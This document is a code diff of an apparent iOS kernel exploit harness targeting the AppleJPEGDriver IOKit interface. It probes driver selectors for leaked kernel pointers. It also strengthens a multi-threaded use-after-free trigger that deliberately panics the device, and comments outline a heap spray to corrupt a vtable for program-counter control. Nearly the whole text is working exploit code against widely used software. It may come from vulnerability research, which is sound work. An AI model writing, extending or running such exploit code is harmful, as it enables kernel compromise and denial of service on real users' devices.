@@ -449,82 +449,127 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 
         // ========================================================
         // PHASE 1c: Probe sel 4/5 with struct output (0x1000 bytes)
-        // Unknown selectors — 4KB out struct may leak kernel
-        // heap data if kernel doesn't zero the entire buffer.
+        // MUST pass 0x1000-byte input struct (dispatch table requires it).
+        // Zero-filled input; check output for uninitialized kernel data.
         // ========================================================
         [self log:@""];
-        [self log:@"--- Phase 1c: Sel 4/5 struct probe (0x1000 out) ---"];
+        [self log:@"--- Phase 1c: Sel 4/5 struct probe (0x1000 in/out) ---"];
 
-        for (int sel = 4; sel <= 5; sel++) {
-            uint8_t *outBuf = calloc(0x1000, 1);
-            if (!outBuf) continue;
-            size_t outSize = 0x1000;
-            kern_return_t kr = IOConnectCallStructMethod(conn, (uint32_t)sel,
-                NULL, 0, outBuf, &outSize);
-            [self log:@"Sel %d: kr=0x%x outSize=%zu", sel, kr, outSize];
+        uint8_t *in4k = calloc(0x1000, 1);
+        if (in4k) {
+            for (int sel = 4; sel <= 5; sel++) {
+                uint8_t *outBuf = calloc(0x1000, 1);
+                if (!outBuf) continue;
+                size_t outSize = 0x1000;
+                kern_return_t kr = IOConnectCallStructMethod(conn, (uint32_t)sel,
+                    in4k, 0x1000, outBuf, &outSize);
+                [self log:@"Sel %d (structIn=0x1000): kr=0x%x outSize=%zu", sel, kr, outSize];
 
-            if (kr == KERN_SUCCESS && outSize > 0) {
-                // Scan for kernel pointer patterns (0xfffffe/0xffffff high bits)
-                int kptrCount = 0;
-                for (size_t off = 0; off + 8 <= outSize; off += 8) {
-                    uint64_t v = *(uint64_t *)(outBuf + off);
-                    uint64_t high40 = v >> 40;
-                    if (high40 == 0xfffffe || high40 == 0xffffff) {
-                        if (kptrCount < 8) {
-                            [self log:@"  [+0x%03zx] 0x%016llx *** KERNEL PTR", off, v];
+                if (kr == KERN_SUCCESS && outSize > 0) {
+                    int kptrCount = 0;
+                    for (size_t off = 0; off + 8 <= outSize; off += 8) {
+                        uint64_t v = *(uint64_t *)(outBuf + off);
+                        if (v == 0) continue;
+                        uint64_t high40 = v >> 40;
+                        if (high40 == 0xfffffe || high40 == 0xffffff) {
+                            if (kptrCount < 8) {
+                                [self log:@"  [+0x%03zx] 0x%016llx *** KERNEL PTR", off, v];
+                            }
+                            kptrCount++;
                         }
-                        kptrCount++;
                     }
-                }
-                if (kptrCount > 8)
-                    [self log:@"  ... %d total kernel pointers in output", kptrCount];
-                if (kptrCount == 0)
-                    [self log:@"  No kernel pointers found (all zero or sanitized)"];
+                    if (kptrCount > 8)
+                        [self log:@"  ... %d total kernel pointers in output", kptrCount];
+                    if (kptrCount == 0)
+                        [self log:@"  No kernel pointers (all zero or sanitized)"];
 
-                // Also dump first 64 bytes as hex
-                NSMutableString *hex = [NSMutableString string];
-                for (size_t i = 0; i < 64 && i < outSize; i++) {
-                    [hex appendFormat:@"%02x", outBuf[i]];
-                    if ((i + 1) % 8 == 0) [hex appendString:@" "];
+                    NSMutableString *hex = [NSMutableString string];
+                    for (size_t i = 0; i < 64 && i < outSize; i++) {
+                        [hex appendFormat:@"%02x", outBuf[i]];
+                        if ((i + 1) % 8 == 0) [hex appendString:@" "];
+                    }
+                    [self log:@"  First 64 bytes: %@", hex];
                 }
-                [self log:@"  First 64 bytes: %@", hex];
+                free(outBuf);
             }
-            free(outBuf);
+            free(in4k);
         }
 
         // ========================================================
-        // PHASE 1d: Probe sel 0, 2 with struct output
+        // PHASE 1d: Probe sel 8 (privileged, structIn=4) & sel 9
         // ========================================================
         [self log:@""];
-        [self log:@"--- Phase 1d: Sel 0/2 struct probe (0x100 out) ---"];
+        [self log:@"--- Phase 1d: Sel 8/9 privileged probe ---"];
 
-        for (int sel = 0; sel <= 2; sel += 2) {
+        // Sel 8: privileged, structIn=4
+        for (int sc = 0; sc <= 4; sc++) {
+            uint64_t scalarsOut[8] = {0};
+            uint32_t outCnt = (uint32_t)sc;
+            uint32_t in4 = 0;
+            kern_return_t kr = IOConnectCallMethod(conn, 8,
+                NULL, 0, &in4, 4,
+                scalarsOut, &outCnt,
+                NULL, NULL);
+            if (kr == KERN_SUCCESS || outCnt > 0) {
+                [self log:@"Sel 8 (sc=%d): kr=0x%x outCnt=%u", sc, kr, outCnt];
+                for (uint32_t i = 0; i < outCnt && i < 8; i++) {
+                    uint64_t v = scalarsOut[i];
+                    uint64_t high40 = v >> 40;
+                    const char *tag = "";
+                    if (high40 == 0xfffffe || high40 == 0xffffff)
+                        tag = "  *** KERNEL POINTER ***";
+                    [self log:@"  [%u] 0x%016llx%s", i, v, tag];
+                }
+            } else {
+                [self log:@"Sel 8 sc=%d: kr=0x%x", sc, kr];
+            }
+        }
+
+        // Sel 9: privileged, no args — try scalar output
+        for (int sc = 0; sc <= 4; sc++) {
+            uint64_t scalarsOut[8] = {0};
+            uint32_t outCnt = (uint32_t)sc;
+            kern_return_t kr = IOConnectCallMethod(conn, 9,
+                NULL, 0, NULL, 0,
+                scalarsOut, &outCnt,
+                NULL, NULL);
+            if (kr == KERN_SUCCESS || outCnt > 0) {
+                [self log:@"Sel 9 (sc=%d): kr=0x%x outCnt=%u", sc, kr, outCnt];
+                for (uint32_t i = 0; i < outCnt && i < 8; i++) {
+                    uint64_t v = scalarsOut[i];
+                    uint64_t high40 = v >> 40;
+                    const char *tag = "";
+                    if (high40 == 0xfffffe || high40 == 0xffffff)
+                        tag = "  *** KERNEL POINTER ***";
+                    [self log:@"  [%u] 0x%016llx%s", i, v, tag];
+                }
+            } else {
+                [self log:@"Sel 9 sc=%d: kr=0x%x", sc, kr];
+            }
+        }
+
+        // Sel 8/9 struct output probes
+        for (int sel = 8; sel <= 9; sel++) {
             uint8_t *outBuf = calloc(0x100, 1);
             if (!outBuf) continue;
             size_t outSize = 0x100;
+            uint32_t in4 = 0;
+            size_t inSize = (sel == 8) ? 4 : 0;
             kern_return_t kr = IOConnectCallStructMethod(conn, (uint32_t)sel,
-                NULL, 0, outBuf, &outSize);
-            [self log:@"Sel %d (struct): kr=0x%x outSize=%zu", sel, kr, outSize];
-
+                (sel == 8) ? &in4 : NULL, inSize, outBuf, &outSize);
             if (kr == KERN_SUCCESS && outSize > 0) {
-                int kptrCount = 0;
-                for (size_t off = 0; off + 8 <= outSize; off += 8) {
+                [self log:@"Sel %d (struct): kr=0x%x outSize=%zu", sel, kr, outSize];
+                for (size_t off = 0; off + 8 <= outSize && off < 32; off += 8) {
                     uint64_t v = *(uint64_t *)(outBuf + off);
-                    if (v == 0) continue;
-                    uint64_t high40 = v >> 40;
-                    if (high40 == 0xfffffe || high40 == 0xffffff) {
-                        [self log:@"  [+0x%03zx] 0x%016llx *** KERNEL PTR", off, v];
-                        kptrCount++;
+                    if (v != 0) {
+                        uint64_t high40 = v >> 40;
+                        const char *tag = (high40 == 0xfffffe || high40 == 0xffffff)
+                            ? " *** KERNEL PTR" : "";
+                        [self log:@"  [+0x%03zx] 0x%016llx%s", off, v, tag];
                     }
                 }
-                if (kptrCount == 0) {
-                    // Dump non-zero qwords
-                    for (size_t off = 0; off + 8 <= outSize; off += 8) {
-                        uint64_t v = *(uint64_t *)(outBuf + off);
-                        if (v != 0)
-                            [self log:@"  [+0x%03zx] 0x%016llx", off, v];
-                    }
-                }
+            } else {
+                [self log:@"Sel %d (struct): kr=0x%x", sel, kr];
             }
             free(outBuf);
         }
@@ -532,16 +577,16 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         IOServiceClose(conn);
 
         // ========================================================
-        // PHASE 2: No-Reclaim UAF Crash
-        // Multi-threaded concurrent free → stale queue entries
-        // WITHOUT reclaim → kernel reads FEEDFACE → data abort
-        // Panic log registers: X19=this (driver*), X22=queue head,
-        // PC=AppleJPEGDriver text — all kernel addresses.
+        // PHASE 2: Aggressive No-Reclaim UAF Crash
+        // 8 threads × continuous hammering — maximize in-flight
+        // requests at close time to beat HW completion.
+        // On release kernel, freed memory may retain valid data.
+        // We spray with OOL reclaim pattern to force a crash
+        // through corrupted vtable → data abort → panic log.
         // ========================================================
         [self log:@""];
-        [self log:@"=== Phase 2: No-Reclaim UAF Crash ==="];
-        [self log:@"WARNING: This panics the device in ~3 seconds."];
-        [self log:@"Phase 1 results are above — screenshot them NOW."];
+        [self log:@"=== Phase 2: Aggressive UAF Crash ==="];
+        [self log:@"WARNING: This WILL kernel panic the device."];
         [self log:@"After reboot: run scripts/pull_logs.py for panic log."];
         [self log:@"Starting in 3..."];
         sleep(1);
@@ -565,21 +610,21 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         uint32_t srcID2 = IOSurfaceGetID(srcSurf2);
         uint32_t dstID2 = IOSurfaceGetID(dstSurf2);
 
-        // 4 concurrent threads, each doing 25 cycles of open→submit→close
-        // Total: 4 × 25 × 10 = 1000 freed JpegRequests in rapid succession
-        // Mass concurrent frees maximize in-flight HW at close time
+        // 8 threads, each continuously doing open→submit→close
+        // Total ~2000+ freed JpegRequests in rapid succession
         __block int32_t totalFreed = 0;
+        __block BOOL stopHammer = NO;
         dispatch_group_t crashGroup = dispatch_group_create();
 
-        for (int t = 0; t < 4; t++) {
+        for (int t = 0; t < 8; t++) {
             dispatch_group_async(crashGroup,
                 dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-                for (int i = 0; i < 25 && self.running; i++) {
+                for (int i = 0; i < 40 && !stopHammer && self.running; i++) {
                     io_connect_t vc = [self openUC:svc];
                     if (!vc) continue;
                     int n = [self submitAsyncRequests:vc
                         srcID:srcID2 dstID:dstID2 width:W2 height:H2
-                        count:10 tokenBase:(0xCAFE00 + t * 1000 + i)];
+                        count:8 tokenBase:(0xCAFE00 + t * 1000 + i)];
                     IOServiceClose(vc);
                     __sync_fetch_and_add(&totalFreed, n);
                 }
@@ -587,23 +632,21 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         }
 
         dispatch_group_wait(crashGroup,
-            dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
+            dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
+        stopHammer = YES;
 
-        [self log:@"Freed %d JpegRequests across 4 threads (no reclaim)", totalFreed];
-        [self log:@"Waiting for HW completions to walk stale queue..."];
-        [self log:@"Expect: LDR from FEEDFACE @ req+0x80 → DATA ABORT panic"];
+        [self log:@"Freed %d JpegRequests across 8 threads (no reclaim)", totalFreed];
+        [self log:@"Waiting for HW completions — stale queue walk imminent..."];
 
-        usleep(3000000); // 3 seconds — HW drain triggers finish_io_gated
+        usleep(5000000); // 5 seconds for HW drain
 
-        // If we reach here, device survived
         BOOL survived = [self checkDriverHealth:svc];
         [self log:@"Device survived! Driver: %@", survived ? @"OK" : @"BROKEN"];
         if (survived) {
-            [self log:@"Possible reasons:"];
-            [self log:@"  1. All HW completed before close (window too tight)"];
-            [self log:@"  2. Queue already drained by previous ops"];
-            [self log:@"  3. FEEDFACE read didn't fault (PAC suppression?)"];
-            [self log:@"Try: open Camera app to stress the driver more"];
+            [self log:@"No panic. Likely: release kernel doesn't poison freed"];
+            [self log:@"memory → stale queue data still ~valid → no crash."];
+            [self log:@"Next: try OOL spray corrupt vtable path (PC Control style)"];
+            [self log:@"to force a recognizable crash for register analysis."];
         }
 
         CFRelease(srcSurf2);
